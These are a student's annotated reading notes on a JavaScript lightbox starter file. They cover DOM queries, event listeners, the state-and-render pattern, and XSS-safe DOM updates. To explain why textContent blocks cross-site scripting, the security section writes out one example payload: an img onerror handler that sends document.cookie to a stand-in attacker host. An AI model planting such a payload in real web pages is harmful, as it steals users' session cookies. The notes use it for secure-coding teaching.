# LIGHTBOX-NOTES.md

**TCSS 506 · Week 3 · Task 2 — Read and Annotate the Code**

Reading notes for `js/lightbox.js` from the Week 3 starter. All line numbers refer to the file as it exists at commit `6828587` — the merge that brought the starter into this repository.

The five sections below answer Task 2's five questions in order.

---

## 1. The DOM

The four DOM references are cached at the top of the file, lines 6–9:

```js
const lb       = document.querySelector('.lightbox');           // line 6
const lbImg    = lb.querySelector('.lightbox__img');             // line 7
const lbCap    = lb.querySelector('.lightbox__caption');         // line 8
const thumbs   = document.querySelectorAll('.gallery__thumb');   // line 9
```

**Single element vs collection.** Lines 6, 7, and 8 use `querySelector`, which returns **one** Element — the first match in document order, or `null` if there is no match. Line 9 uses `querySelectorAll`, which returns a **NodeList** containing every matching element on the page. The plural variable name `thumbs` reflects the plural return.

**Why `lb.querySelector(...)` for nested elements instead of `document.querySelector(...)`.** Two reasons that matter:

1. **Scoping (correctness).** Searching from `lb` guarantees we find the `.lightbox__img` and `.lightbox__caption` *inside our overlay*, not some other element with the same class that might exist elsewhere on the page. As soon as this code is integrated into a larger document — exactly what Task 3 asks us to do — that becomes a real risk.
2. **Performance.** Searching a small subtree is cheaper than walking the entire document.

The pattern also reads more like the HTML it mirrors: `lbImg` and `lbCap` *belong to* `lb`.

---

## 2. Event Listeners

There are exactly three `addEventListener` calls — lines 48, 51, and 55:

| Line | Element | Event type | Handler does, in one phrase |
|---|---|---|---|
| 48 | each `.gallery__thumb` (in a `forEach` loop) | `click` | calls `openLightbox(i)` with the thumb's index |
| 51 | the lightbox container `lb` | `click` | calls `closeLightbox()` *only if* the click landed on the backdrop itself, not on the image inside |
| 55 | `document` | `keydown` | calls `closeLightbox()` if the key was `Escape` and the lightbox is open |

The actual code:

```js
// lines 47–49
thumbs.forEach((thumb, i) => {
  thumb.addEventListener('click', () => openLightbox(i));
});

// lines 51–53
lb.addEventListener('click', (e) => {
  if (e.target === lb) closeLightbox();
});

// lines 55–57
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape' && state.isOpen) closeLightbox();
});
```

**Does any of them use event delegation?** No — not in the textbook sense of "one listener on a parent that dispatches to many children."

The line 47–49 block is actually the *opposite* of delegation: it attaches a separate listener to each thumbnail individually. The line 51 listener does inspect `e.target` (`if (e.target === lb) closeLightbox();`), which is the mechanism delegation relies on, but here it is being used for **target filtering** — restricting *when* the listener reacts — rather than for routing one listener to many distinct children. So the `event.target` machinery is present, but the delegation pattern is not.

---

## 3. State and the render pattern

**The state object** lives on lines 12–20 and has three fields:

- `isOpen` — boolean, whether the overlay is currently shown
- `index` — number, which image in `images` is currently displayed
- `images` — array of `{ src, caption }` objects (the source data for the gallery)

```js
const state = {
  isOpen: false,
  index: 0,
  images: [ /* { src, caption } objects, lines 16–18 */ ],
};
```

**Trace: what happens when a user clicks a thumbnail.**

1. The click listener registered on line 48 fires for that thumbnail with its captured index `i`.
2. The handler calls `openLightbox(i)` (defined line 23).
3. Inside `openLightbox`, `state.isOpen = true` (line 24) is the first field to change, then `state.index = i` (line 25).
4. `render()` is called on line 26.
5. `render()` (lines 35–44) sees `state.isOpen === true`, reads the corresponding `{ src, caption }` from `state.images[state.index]` (line 37), sets the image's `src` attribute (line 38), sets the caption's `textContent` (line 39), and adds the `open` class to the lightbox container (line 40).
6. The DOM now reflects the new state. CSS sees the `open` class change and runs its opacity transition; the user sees the lightbox fade in.

**Where the mutators are.** `openLightbox` (lines 23–27) and `closeLightbox` (lines 29–32). Both follow the same shape: change one or two `state` fields, then call `render()` on the last line. That last `render()` call is what keeps state and DOM from drifting apart.

**Where `render()` is defined and called from.** Defined on lines 35–44. It is called from exactly two places:

- `openLightbox` — line 26
- `closeLightbox` — line 31

It is **never** called from an event listener directly. The flow is always: listener → mutator → render.

**What would visibly break if a mutator updated state but forgot to call `render()`.** The state object would change, but the DOM would not. If `openLightbox` skipped its `render()` call, clicking a thumbnail would silently set `state.isOpen = true` and `state.index = i` — and *nothing visible would happen*. The lightbox would appear stuck. Vanilla JavaScript does not watch state for you; the explicit `render()` call is what makes state changes visible.

---

## 4. Security

The two XSS-safe DOM updates inside `render()` are on lines 38 and 39:

```js
lbImg.setAttribute('src', src);   // line 38
lbCap.textContent = caption;       // line 39
```

**Why these are safe.** `textContent` inserts a string as **literal text** — the browser displays the characters as-is and never parses them as HTML. `setAttribute` writes a string into an attribute slot — the value is treated as a URL to fetch, not as code to execute or markup to parse.

**The attack class prevented: Cross-Site Scripting — XSS.**

**What an attacker could do if line 39 used `innerHTML` instead.** Suppose the line became `lbCap.innerHTML = caption;` and a caption were sourced from somewhere user-controllable. The attacker supplies:

```html
<img src=x onerror="fetch('https://evil.example/steal?c=' + document.cookie)">
```

The browser would now **parse the caption as HTML**, attempt to load a non-existent image (`src=x`), fail, and run the `onerror` JavaScript — which fires off a request carrying every cookie the page can read. The attacker's server now has the user's session cookie. With `textContent`, the same string is rendered as visible characters: literally the angle brackets and quotes, never executed.

The same concern applies to line 38 if it were rewritten to anything that re-parses HTML rather than writing into an attribute slot. With `setAttribute('src', src)`, the value is a URL the browser fetches — not code it runs.

XSS matters most when the data is *user-supplied* — usernames, comments, anything from an input box or a database. The lightbox starter's captions are hard-coded, but the safe pattern is established here so the protection cannot be accidentally lost once the data starts coming from somewhere less trustworthy.

---

## 5. Patterns

The lecture named five recurring patterns: **state+render**, **event listener**, **delegation**, **module scope**, **debounce/throttle**. What is actually in `lightbox.js`:

### state + render — **present**

The whole file is built around this pattern. The state object on lines 12–20:

```js
const state = {
  isOpen: false,
  index: 0,
  images: [ /* ... */ ],
};
```

The `render()` function on lines 35–44 reads `state` and writes to the DOM:

```js
function render() {
  if (state.isOpen) {
    const { src, caption } = state.images[state.index];
    lbImg.setAttribute('src', src);
    lbCap.textContent = caption;
    lb.classList.add('open');
  } else {
    lb.classList.remove('open');
  }
}
```

Every mutator ends with `render()` — line 26 in `openLightbox`, line 31 in `closeLightbox`.

### event listener — **present**

Three `addEventListener` calls, lines 48, 51, and 55. Quoted in full in section 2 above.

### event delegation — **not present**

Line 47–49 attaches a separate listener to *each* thumbnail individually rather than one listener on a gallery parent. The line 51 listener does inspect `e.target` (`if (e.target === lb) closeLightbox();`), but that is target filtering — limiting what the listener reacts to — not the canonical "one listener on a parent dispatching to many children" pattern.

### module scope — **present**

Every top-level `const` and `function` lives in the script's own top-level scope. Nothing is attached to `window` or any other global object:

```js
const lb       = document.querySelector('.lightbox');           // line 6
const state    = { /* ... */ };                                  // line 12
function openLightbox(i)  { /* ... */ }                          // line 23
function closeLightbox()  { /* ... */ }                          // line 29
function render()         { /* ... */ }                          // line 35
```

The event-listener callbacks reference these names through closure, not through any global lookup. Nothing pollutes `window`, and nothing on the surrounding page can collide with `state` or `render`.

### debounce / throttle — **not present**

There is no rate-limiting wrapper around any handler. None of the events the lightbox cares about — `click`, `keydown` — fires fast enough to need one.

---

## Quick recap

| Pattern | In file? | Lines |
|---|---|---|
| state + render | yes | 12–20, 23–32, 35–44 |
| event listener | yes | 48, 51, 55 |
| delegation | no | — |
| module scope | yes | 6–9, 12, 23, 29, 35 |
| debounce / throttle | no | — |

Three of the five patterns appear. The two absences are honest: the gallery is small enough not to need delegation, and the events the file listens for do not fire at rates that would justify debouncing.
